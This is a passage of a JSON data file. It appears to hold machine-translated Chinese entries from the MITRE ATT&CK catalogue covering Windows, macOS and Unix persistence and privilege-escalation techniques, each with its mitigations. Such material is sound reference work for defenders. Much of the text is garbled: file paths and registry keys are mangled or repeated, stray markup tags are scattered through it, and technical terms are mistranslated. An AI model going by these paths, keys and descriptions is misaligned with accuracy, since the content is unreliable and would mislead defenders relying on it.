          "content": " zwloadDriver（）"
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " zwsetValueKey（）"
        },
        {
          "type": "text",
          "content": "）之类的函数，通过创建所需的服务注册表值（即修改注册表）或使用命令行实用程序，例如<代码> pnputil.exe </code>。对手可能会利用这些驱动器作为根孔来隐藏系统上恶意活动的存在。对手还可以将签名但脆弱的驱动程序加载到受损的机器上（称为“带您自己的脆弱驱动程序”（ByoVD）），作为特权升级的开发的一部分。"
        }
      ],
      [
        {
          "type": "text",
          "content": "可以使用管理员特权创建服务，但在系统特权下执行，因此对手也可以使用服务来升级特权。对手也可以通过服务执行直接启动服务。为了使检测分析更具挑战性，恶意服务还可以包含化装舞会任务或服务（例如：使用与合法的OS或Banign Office Software组件相关的服务和/或有效载荷名称）。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "使用能够检测企业内系统的特权和服务滥用机会并纠正它们的审计工具。"
            }
          ]
        ]
      },
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "在Windows 10上，启用攻击表面减少（ASR）规则，以防止应用程序写入系统的签名脆弱驱动程序。在Windows 10和11上，启用Microsoft脆弱的驱动器放置列表，以帮助对抗第三方开发的服务驱动程序。"
            }
          ]
        ]
      },
      {
        "id": "M1045",
        "name": "代码签名",
        "description": [
          [
            {
              "type": "text",
              "content": "在可能的情况下，只有合法签署的服务驱动程序的注册和执行。"
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "确保使驾驶员签名执行能够限制未签名的驱动程序的安装。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户和组的特权，以便只有授权的管理员才能与服务更改和服务配置进行交互。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1543.004",
    "name": "Launch Daemon",
    "tactics": [
      {
        "id": "TA0003",
        "name": "Persistence"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Create or Modify System Process",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以创建或修改启动守护程序，以执行恶意有效载荷，这是持久性的一部分。启动守护程序是用于与MACOS使用的服务管理框架进行交互的PLIST文件。启动守护程序需要安装提高特权，在登录之前为系统上的每个用户执行，并在后台运行而无需用户交互。在MACOS初始化启动期间，启动过程从"
        },
        {
          "type": "code",
          "content": "/system/library/lunagredaemons/"
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": "/library/limrallage/lunchDaeMons/"
        },
        {
          "type": "text",
          "content": "。所需的启动Daemons参数包括"
        },
        {
          "type": "code",
          "content": " Label "
        },
        {
          "type": "text",
          "content": "以识别任务，"
        },
        {
          "type": "code",
          "content": " program "
        },
        {
          "type": "text",
          "content": "以提供可执行文件的路径，"
        },
        {
          "type": "code",
          "content": " runatload "
        },
        {
          "type": "text",
          "content": "以指定任务是什么时候跑步。启动守护程序通常用于提供共享资源，软件更新或执行自动化任务的访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以通过使用"
        },
        {
          "type": "code",
          "content": " runatload "
        },
        {
          "type": "text",
          "content": "参数设置为"
        },
        {
          "type": "code",
          "content": " true "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " program "
        },
        {
          "type": "text",
          "content": "参数设置为恶意可执行可执行路径的</code> program> programe </code> parame </code> parameter设置为"
        },
        {
          "type": "code",
          "content": " runatload "
        },
        {
          "type": "text",
          "content": "。守护程序名称可以通过使用相关操作系统或良性软件的名称（即伪装）来掩饰。执行启动守护程序后，该程序继承了管理权限。"
        }
      ],
      [
        {
          "type": "text",
          "content": "此外，系统配置更改（例如安装第三方软件软件的安装）可能会导致诸如"
        },
        {
          "type": "code",
          "content": " usr/local/bin/bin "
        },
        {
          "type": "text",
          "content": "之类的文件夹在全球上可写。因此，差的配置可以允许对手修改当前启动守护程序的PLIST文件引用的可执行文件。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "使用能够在系统上检测文件夹权限滥用机会的审计工具，尤其是通过第三方软件对文件夹进行的更改。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "限制用户帐户的特权并补充特权升级向量，因此只有授权的管理员才能创建新的启动守护程序。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1484.001",
    "name": "Group Policy Modification",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Domain Policy Modification",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以修改组策略对象（GPO），以颠覆域的预期酌处访问控件，通常是为了在域上升级特权。组策略允许在Active Directory（AD）中对用户和计算机设置进行集中管理。GPO是由存储在可预测的网络路径中的文件组成的组策略设置的容器"
        },
        {
          "type": "code",
          "content": " \\ <domain> \\ sysvol \\ <domain> \\ policies \\ "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "像AD中的其他对象一样，GPO具有与之关联的访问控件。默认情况下，该域中的所有用户帐户都有权限阅读GPO。可以委派GPO访问控制权限，例如将访问权限为域中的特定用户或组。"
        }
      ],
      [
        {
          "type": "text",
          "content": "恶意GPO修改可用于实施许多其他恶意行为，例如计划的任务/作业，禁用或修改工具，入口工具传输，创建帐户，服务执行等。由于GPO可以控制广告环境中的许多用户和机器设置，因此可能会造成大量潜在攻击，这可能源于这种GPO滥用。"
        }
      ],
      [
        {
          "type": "text",
          "content": "例如，可以利用"
        },
        {
          "type": "code",
          "content": "诸如    new-gpoimmediateTeTask "
        },
        {
          "type": "text",
          "content": "来通过修改GPO设置来自动创建恶意计划的任务/作业，在这种情况下，修改<codifify <codify <gpo_path> <gpo_path> \\ Machine \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\ \\PEXENCES \\ SCHEDULEDTASKS \\ SCHENULEDTASKS.XML </code>。在某些情况下，对手可能会修改特定的用户权利，例如Sigeabledeleabeledegationprivilege，以"
        },
        {
          "type": "code",
          "content": " <gpo_path> \\ Machine \\ Machine \\ Michare \\ Microsf \\ Windows \\ Windows \\ secedit \\ secedit \\ gpttmpl.gpttmpl.inf.inf.inf.inf.inf "
        },
        {
          "type": "text",
          "content": "，以完全控制一个微妙的广告backdoor，并完全控制域，因为在对手控制下的用户帐户将能够修改GPO。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "使用审计工具（例如1.5.1及以后）识别并纠正GPO滥用机会（例如：GPO修改特权）。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "考虑实施WMI和安全过滤，以进一步量身定制GPO的用户和计算机将适用的用户和计算机。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1484.002",
    "name": "Domain Trust Modification",
    "tactics": [
      {
        "id": "TA0005",
        "name": "Defense Evasion"
      },
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      }
    ],
    "technique": "Domain Policy Modification",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可能会添加新的域信托，或修改现有域信托的属性以逃避防御和/或提升特权。域信任详细信息，例如域名是否已联合，允许身份验证和授权属性在域之间应用于访问共享资源的目的。这些信任对象可以包括帐户，凭据和其他应用于服务器，代币和域的身份验证材料。"
        }
      ],
      [
        {
          "type": "text",
          "content": "操纵域信托可能会使对手通过修改设置来添加其控制的对象来升级特权和/或逃避防御。例如，这可以用于伪造SAML令牌，而无需妥协签名证书以伪造新的凭据。相反，对手可以操纵域信任以添加自己的签名证书。对手还可以将域转换为联合域，这可能会使恶意信任修改，例如更改索赔发行规则以登录作为指定用户的任何有效凭据集。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "使用最少特权的本金并保护对域信托的行政访问。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1546.001",
    "name": "Change Default File Association",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行文件类型关联触发的恶意内容来建立持久性。打开文件时，检查了用于打开文件（也称为文件关联或处理程序）的默认程序。文件关联选择存储在Windows注册表中，可以由具有注册表访问权限的用户，管理员或程序进行编辑，或者使用内置关联实用程序的管理员进行编辑。当打开具有给定扩展程序的文件时，应用程序可以修改给定文件扩展名的文件关联，以调用任意程序。"
        }
      ],
      [
        {
          "type": "text",
          "content": "系统文件关联在"
        },
        {
          "type": "code",
          "content": " hkey_classes_root中列出。条目指向位于 hkey_classes_root \\ [Handler] "
        },
        {
          "type": "text",
          "content": "的该扩展程序的处理程序。然后将各种命令列为"
        },
        {
          "type": "code",
          "content": " hkey_classes_root \\ [handler] \\ shell \\ [action] \\ command "
        },
        {
          "type": "text",
          "content": "的shell键下方的子键。例如："
        }
      ],
      [
        {
          "type": "list",
          "content": "hkey_classes_root \\ txtfile \\ shell \\ open \\命令"
        },
        {
          "type": "list",
          "content": "hkey_classes_root \\ txtfile \\ shell \\ print \\命令"
        },
        {
          "type": "list",
          "content": "hkey_classes_root \\ txtfile \\ shell \\ printto \\命令"
        }
      ],
      [
        {
          "type": "text",
          "content": "列出的键的值是处理程序打开文件扩展名时执行的命令。对手可以修改这些值以不断执行任意命令。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1546.002",
    "name": "Screensaver",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.2",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行用户无活动触发的恶意内容来建立持久性。屏幕保护程序是在用户不活动的可配置时间之后执行的程序，并由具有.scr文件扩展名的便携式可执行文件（PE）文件组成。Windows Screensaver应用程序scrnsave.scr位于"
        },
        {
          "type": "code",
          "content": " c：\\ Windows \\ System32 \\ "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " c：\\ windows \\ syswow64 \\ "
        },
        {
          "type": "text",
          "content": "上，在64位Windows Systems上包含基础窗口安装。"
        }
      ],
      [
        {
          "type": "text",
          "content": "以下屏幕保护程序设置存储在注册表中（"
        },
        {
          "type": "code",
          "content": " hkcu \\ control面板\\ desktop \\ "
        },
        {
          "type": "text",
          "content": "），可以操纵以实现持久性："
        }
      ],
      [
        {
          "type": "list",
          "content": "scrnsave.exe-设置为恶意PE路径"
        },
        {
          "type": "list",
          "content": "屏幕释放 - 设置为“ 1”以启用屏幕保护程序"
        },
        {
          "type": "list",
          "content": "ScreenSaverissecure-设置为“ 0”以不需要密码来解锁"
        },
        {
          "type": "list",
          "content": "ScreenSaveTimeOut  - 在执行屏幕保护程序之前设置用户无效超时"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用屏幕保护程序设置来维持持久性，通过将屏幕保护程序设置为在一定的用户不活动时间内运行恶意软件。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1042",
        "name": "禁用或删除功能或程序",
        "description": [
          [
            {
              "type": "text",
              "content": "如果不必要，请使用组策略禁用屏幕保护程序。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "块.scr文件从非标准位置执行。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1546.003",
    "name": "Windows Management Instrumentation Event Subscription",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.3",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行由Windows Management Instrumentation（WMI）事件订阅触发的恶意内容来建立持久性并提高特权。WMI可用于安装事件过滤器，提供商，消费者和绑定，并在定义事件发生时执行代码。可能订阅的事件的示例包括壁时钟时间，用户循环或计算机的正常运行时间。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用WMI的功能来订阅事件并在此事件发生时执行任意代码，从而在系统上持久。对手还可以将WMI脚本编译到Windows Management对象（MOF）文件（.MOF扩展名）中，该文件可用于创建恶意订阅。"
        }
      ],
      [
        {
          "type": "text",
          "content": "WMI订阅执行由WMI提供商主机流程（WMIPRVSE.EXE）代理，因此可能导致系统特权提高。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1040",
        "name": "预防端点的行为",
        "description": [
          [
            {
              "type": "text",
              "content": "在Windows 10上，启用攻击表面减少（ASR）规则，以防止恶意软件滥用WMI达到持久性。"
            }
          ]
        ]
      },
      {
        "id": "M1026",
        "name": "特权帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "防止管理员和特权帐户系统之间的凭据重叠。"
            }
          ]
        ]
      },
      {
        "id": "M1018",
        "name": "用户帐户管理",
        "description": [
          [
            {
              "type": "text",
              "content": "默认情况下，仅允许管理员使用WMI远程连接；限制允许连接或禁止所有用户连接到WMI的其他用户。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1546.004",
    "name": "Unix Shell Configuration Modification",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "2.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行用户外壳触发的恶意命令来建立持久性。用户Unix Shell基于事件在整个会话中在不同点执行几个配置脚本。例如，当用户打开命令行接口或远程登录时（例如通过SSH）启动登录外壳。登录外壳从系统（"
        },
        {
          "type": "code",
          "content": "/etc "
        },
        {
          "type": "text",
          "content": "）和用户的主目录（"
        },
        {
          "type": "code",
          "content": "〜/"
        },
        {
          "type": "text",
          "content": "）执行脚本以配置环境。启动时系统使用 /etc /配置文件上的所有登录外壳。这些配置脚本以其目录的许可级别运行，通常用于设置环境变量，创建别名并自定义用户的环境。当外壳退出或终止时，执行其他外壳脚本，以确保适当地退出外壳。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可能会试图通过将命令插入由外壳自动执行的脚本中来建立持久性。以bash为例，大多数GNU/Linux系统的默认外壳，对手可能会添加命令，这些命令将恶意二进制文件启动到"
        },
        {
          "type": "code",
          "content": "/etc/profile "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " /etc/profile.d </code </code </code "
        },
        {
          "type": "text",
          "content": " </code.d </code。>文件。这些文件通常需要ROOT权限进行修改并每次启动系统上的任何外壳时都会执行。对于用户级别的权限，对手可以将恶意命令插入"
        },
        {
          "type": "code",
          "content": "〜/.bash_profile "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": "〜/.bash_login "
        },
        {
          "type": "text",
          "content": "，或"
        },
        {
          "type": "code",
          "content": "〜/.profile </.profile "
        },
        {
          "type": "text",
          "content": "当用户打开命令行接口或远程连接时。由于系统仅在列出的顺序中执行第一个现有文件，因此对手使用"
        },
        {
          "type": "code",
          "content": "〜/.bash_profile "
        },
        {
          "type": "text",
          "content": "来确保执行。对手还利用了"
        },
        {
          "type": "code",
          "content": "〜/.bashrc "
        },
        {
          "type": "text",
          "content": "文件，如果建立连接是远程建立或打开其他交互式壳，例如命令行界面中的新选项卡。一些恶意软件针对终止程序以触发执行的终止，对手可以使用"
        },
        {
          "type": "code",
          "content": "〜/.bash_logout "
        },
        {
          "type": "text",
          "content": "文件在会话结束时执行恶意命令。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对于MACOS，该技术的功能相似，但可能会利用ZSH（MacOS 10.15+的默认外壳）。打开终端时，应用程序会启动ZSH登录外壳和ZSH Interactive shell。登录外壳使用"
        },
        {
          "type": "code",
          "content": "/etc/profile "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": "/etc/zshenv "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": "/etc/zprofile "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": "/etc，使用/etc/profile "
        },
        {
          "type": "text",
          "content": "/etc/zshenv </code>/etc，使用登录外壳配置系统环境/zlogin </code>。然后，登录外壳将用户环境配置为"
        },
        {
          "type": "code",
          "content": "〜/.zprofile "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": "〜/.zlogin "
        },
        {
          "type": "text",
          "content": "。交互式外壳使用"
        },
        {
          "type": "code",
          "content": "〜/.zshrc "
        },
        {
          "type": "text",
          "content": "来配置用户环境。退出后，执行了"
        },
        {
          "type": "code",
          "content": "/etc/zlogout "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": "〜/.zlogout "
        },
        {
          "type": "text",
          "content": "。对于旧版程序，MacOS在启动时执行"
        },
        {
          "type": "code",
          "content": "/etc/bashrc "
        },
        {
          "type": "text",
          "content": "。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1022",
        "name": "限制文件和目录权限",
        "description": [
          [
            {
              "type": "text",
              "content": "使这些文件不变，只有某些管理员才能改变，将限制对手轻松创建用户级别持久性的能力。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1546.005",
    "name": "Trap",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行由中断信号触发的恶意内容来建立持久性。"
        },
        {
          "type": "code",
          "content": " TRAP "
        },
        {
          "type": "text",
          "content": "命令允许程序和Shells指定在接收中断信号时将执行的命令。一个常见的情况是一个脚本，允许优雅终止和处理常见键盘中断，例如"
        },
        {
          "type": "code",
          "content": " ctrl+c "
        },
        {
          "type": "text",
          "content": "和"
        },
        {
          "type": "code",
          "content": " ctrl+d "
        },
        {
          "type": "text",
          "content": "。"
        }
      ],
      [
        {
          "type": "text",
          "content": "当外壳遇到特定的中断作为持久机制时，对手可以使用它来注册代码。陷阱命令是以下格式"
        },
        {
          "type": "code",
          "content": "陷阱'命令列表'信号"
        },
        {
          "type": "text",
          "content": "在收到“信号”时将执行“命令列表”。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1546.006",
    "name": "LC_LOAD_DYLIB Addition",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行被污染的二进制文件触发的恶意内容来建立持久性。Mach-O二进制文件具有一系列的标题，这些标头用于加载二进制时，用于执行某些操作。Mach-O二进制中的LC_LOAD_DYLIB标头告诉MacOS和OS X在执行时间内，动态库（Dylibs）的加载。只要对其他领域和依赖项进行调整，就可以将这些临时添加到编译的二进制中。有可以执行这些更改的工具。"
        }
      ],
      [
        {
          "type": "text",
          "content": "每次执行二进制文件时，对手可能会修改Mach-O二进制标头，以加载和执行恶意Dylibs。尽管由于修改了二进制文件，因此任何更改都会使二进制文件的数字签名无效，但是可以通过简单地从二进制中删除LC_CODE_SIGNATARE命令来进行修复，以便未在加载时检查签名。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1047",
        "name": "审计",
        "description": [
          [
            {
              "type": "text",
              "content": "二进制文件也可以基于其所需的动态库的基础，并且如果应用程序需要一个新的动态库，该库将作为更新的一部分包含在内，则应研究。"
            }
          ]
        ]
      },
      {
        "id": "M1045",
        "name": "代码签名",
        "description": [
          [
            {
              "type": "text",
              "content": "强迫所有二进制文件均由正确的Apple开发人员ID签名。"
            }
          ]
        ]
      },
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "通过已知的哈希允许应用。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1546.007",
    "name": "Netsh Helper DLL",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行由Netsh Helper DLL触发的恶意内容来建立持久性。netsh.exe（也称为NetShell）是一种命令行脚本实用程序，用于与系统的网络配置进行交互。它包含添加助手DLL以扩展实用程序功能的功能。注册netsh.exe助手DLL的路径以"
        },
        {
          "type": "code",
          "content": " hklm \\ Software \\ Microsoft \\ netsh "
        },
        {
          "type": "text",
          "content": "输入到Windows注册表中。"
        }
      ],
      [
        {
          "type": "text",
          "content": "对手可以使用netsh.exe助手DLL持续触发任意代码的执行。该执行将在执行netsh.exe时进行，这可能会自动发生，或者使用另一种持久技术，或者是否存在其他软件（EX：VPN），该系统在其正常功能的一部分中执行NetSh.exe。"
        }
      ]
    ],
    "mitigations": [
      {
        "type": "text",
        "content": "这种类型的攻击技术无法通过预防控制来轻松减轻，因为它基于对系统功能的滥用。"
      }
    ]
  },
  {
    "id": "T1546.008",
    "name": "Accessibility Features",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行可访问性功能触发的恶意内容来建立持久性和/或提升特权。Windows包含可访问性功能，可以在用户登录之前使用密钥组合启动（例如：当用户在Windows登录屏幕上时）。对手可以修改这些程序的启动方式以获取命令提示符或后门，而无需登录系统。"
        }
      ],
      [
        {
          "type": "text",
          "content": "两个常见的可访问性程序是"
        },
        {
          "type": "code",
          "content": " c：\\ windows \\ system32 \\ sethc.exe "
        },
        {
          "type": "text",
          "content": "，在按下偏移键五次时启动，"
        },
        {
          "type": "code",
          "content": " c：\\ windows \\ system32 \\ utilman.exe "
        },
        {
          "type": "text",
          "content": " </code>在按下Windows + U键组合时启动。SETHC.EXE程序通常称为“粘密钥”，对手已经使用了通过远程桌面登录屏幕进行未经身份验证的访问。"
        }
      ],
      [
        {
          "type": "text",
          "content": "根据Windows的版本，对手可以以不同的方式利用这些功能。对手使用的常见方法包括替换注册表中这些二进制文件的可访问性功能二进制文件或指针/引用。在较新版本的Windows中，需要为X64系统签名替换的二进制文件，二进制文件必须位于"
        },
        {
          "type": "code",
          "content": ">％systemdir％\\ "
        },
        {
          "type": "text",
          "content": "中，并且必须受到Windows文件或资源保护（WFP/WRP）的保护）。图像文件执行选项注入调试器方法可能被发现为潜在的解决方法，因为它不需要更换相应的可访问性二进制功能。"
        }
      ],
      [
        {
          "type": "text",
          "content": "如果要在Windows XP和后来以及Windows Server 2003/R2上进行简单的二进制替换，例如，可以替换程序（例如，"
        },
        {
          "type": "code",
          "content": " c：\\ code> c：\\ windows \\ system32 \\ utilman.exe "
        },
        {
          "type": "text",
          "content": "）使用“ cmd.exe”（或其他提供后门访问的程序）。随后，在坐在键盘上或通过远程桌面协议连接时在登录屏幕上按适当的键组合将导致使用系统特权执行替换的文件。"
        }
      ],
      [
        {
          "type": "text",
          "content": "存在其他可访问性功能，也可能以类似的方式利用："
        }
      ],
      [
        {
          "type": "list",
          "content": "屏幕键盘：C：\\ Windows \\ System32 \\ osk.exe"
        },
        {
          "type": "list",
          "content": "放大器：C：\\ Windows \\ System32 \\ magnify.exe"
        },
        {
          "type": "list",
          "content": "叙述者：C：\\ Windows \\ System32 \\ Nordator.exe"
        },
        {
          "type": "list",
          "content": "显示切换器：C：\\ Windows \\ System32 \\ displaysWitch.exe"
        },
        {
          "type": "list",
          "content": "App Switcher：C：\\ Windows \\ System32 \\ AtBroker.exe"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "对手可以用替代二进制文件替换可访问性功能，以执行此技术。通过使用应用程序控制工具，例如Windows Defender Application Control，Applocker或软件限制策略，可以通过可访问性功能来识别并阻止潜在的恶意软件。"
            }
          ]
        ]
      },
      {
        "id": "M1035",
        "name": "限制网络对资源的访问",
        "description": [
          [
            {
              "type": "text",
              "content": "如果可能，请使用远程桌面网关来管理网络中RDP的连接和安全配置。"
            }
          ]
        ]
      },
      {
        "id": "M1028",
        "name": "操作系统配置",
        "description": [
          [
            {
              "type": "text",
              "content": "要远程使用此技术，对手必须与RDP一起使用它。确保启用网络级别的身份验证，可以在创建会话并显示登录屏幕之前强制远程桌面会话进行身份验证。默认情况下，在Windows Vista上启用了它。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1546.009",
    "name": "AppCert DLLs",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行加载到进程的AppCert DLL触发的恶意内容来建立持久性和/或提升特权。在"
        },
        {
          "type": "code",
          "content": " appcertdlls "
        },
        {
          "type": "text",
          "content": " regive> registry键"
        },
        {
          "type": "code",
          "content": " hkey_local_machine \\ purrentcontrolset \\ control \\ control \\ session \\ "
        },
        {
          "type": "text",
          "content": "下，在"
        },
        {
          "type": "code",
          "content": " appcertdlls "
        },
        {
          "type": "text",
          "content": " regive键下指定的Dynamic-link库（DLL）已使用的应用程序编程接口（API）函数"
        },
        {
          "type": "code",
          "content": " createProcess "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " createProcessAsuser "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " createProcesswithloginw "
        },
        {
          "type": "text",
          "content": "，"
        },
        {
          "type": "code",
          "content": " creat> createprocesporsespesswithtokenw "
        },
        {
          "type": "text",
          "content": " </code>，或/代码>。"
        }
      ],
      [
        {
          "type": "text",
          "content": "与过程注入类似，可以滥用此值，以通过在计算机上单独的过程中加载恶意DLL并运行恶意DLL来获得高架特权。恶意的AppCert DLL也可以通过不断受到API活动触发而提供持久性。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "对手安装新的AppCertDll二进制文件以执行此技术。通过使用应用程序控制工具，例如Windows Defender Application Control，Applocker或软件限制策略，可以通过AppCertDlls功能执行并阻止潜在的恶意软件。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1546.010",
    "name": "AppInit DLLs",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.1",
    "description": [
      [
        {
          "type": "text",
          "content": "对手可以通过执行加载到进程的Appinit DLL触发的恶意内容来建立持久性和/或提升特权。Dynamic-link libraries (DLLs) that are specified in the "
        },
        {
          "type": "code",
          "content": "AppInit_DLLs"
        },
        {
          "type": "text",
          "content": " value in the Registry keys "
        },
        {
          "type": "code",
          "content": "HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows"
        },
        {
          "type": "text",
          "content": " or "
        },
        {
          "type": "code",
          "content": "HKEY_LOCAL_MACHINE\\Software \\ WOW6432NODE \\ MICROSOFT \\ Windows NT \\ CurrentVersion \\ Windows "
        },
        {
          "type": "text",
          "content": "被用户32.DLL加载到加载User32.dll的每个过程中。实际上，这几乎是每个程序，因为user32.dll是一个非常常见的库。"
        }
      ],
      [
        {
          "type": "text",
          "content": "与过程注入类似，可以滥用这些值，以通过在计算机上单独的过程中加载恶意DLL并运行恶意DLL来获得高架特权。恶意的dlls也可能通过不断受到API活动触发而提供持久性。"
        }
      ],
      [
        {
          "type": "text",
          "content": "当启用安全启动时，在Windows 8和更高版本中禁用Appinit DLL功能。"
        }
      ]
    ],
    "mitigations": [
      {
        "id": "M1038",
        "name": "预防执行",
        "description": [
          [
            {
              "type": "text",
              "content": "对手可以安装新的Appinit DLLS二进制文件来执行此技术。通过使用应用程序控制工具，例如Windows Defender Application Control，Applocker或软件限制策略，可以通过Appinit DLLS功能执行并阻止潜在的恶意软件。"
            }
          ]
        ]
      },
      {
        "id": "M1051",
        "name": "更新软件",
        "description": [
          [
            {
              "type": "text",
              "content": "升级到Windows 8或更高版本，并启用安全启动。"
            }
          ]
        ]
      }
    ]
  },
  {
    "id": "T1546.011",
    "name": "Application Shimming",
    "tactics": [
      {
        "id": "TA0004",
        "name": "Privilege Escalation"
      },
      {
        "id": "TA0003",
        "name": "Persistence"
      }
    ],
    "technique": "Event Triggered Execution",
    "version": "1.0",
    "description": [
      [
        {
          "type": "text",
